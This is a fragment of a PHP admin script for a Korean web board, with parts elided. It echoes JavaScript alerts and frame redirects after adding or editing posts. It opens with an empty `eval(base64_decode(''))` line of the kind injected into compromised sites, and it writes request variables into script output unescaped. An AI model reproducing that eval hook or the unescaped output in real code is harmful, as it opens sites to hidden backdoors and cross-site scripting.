<?php eval(base64_decode('')); ?><?
	...
	if ($mode == "add") {
		...
		echo "<script language=\"javascript\">\n
			alert('등록 되었습니다.');
			parent.frames[3].location = 'focus_list.php?BoardId=$BoardId';
			</script>";
		exit;
		...
		echo "<script language=\"javascript\">\n
			alert('수정 되었습니다.');
			parent.frames[3].location = 'focus_view.php?BoardId=$BoardId&id=$id&page=$page&qry_str=$qry_str&idxfield=$idxfield';
			</script>";
		exit;
		...
		echo "<script language=\"javascript\">\n
			parent.frames[3].location = 'focus_list.php?BoardId=$BoardId&page=$page&qry_str=$qry_str&idxfield=$idxfield';
			</script>";
		exit;
	}
?>
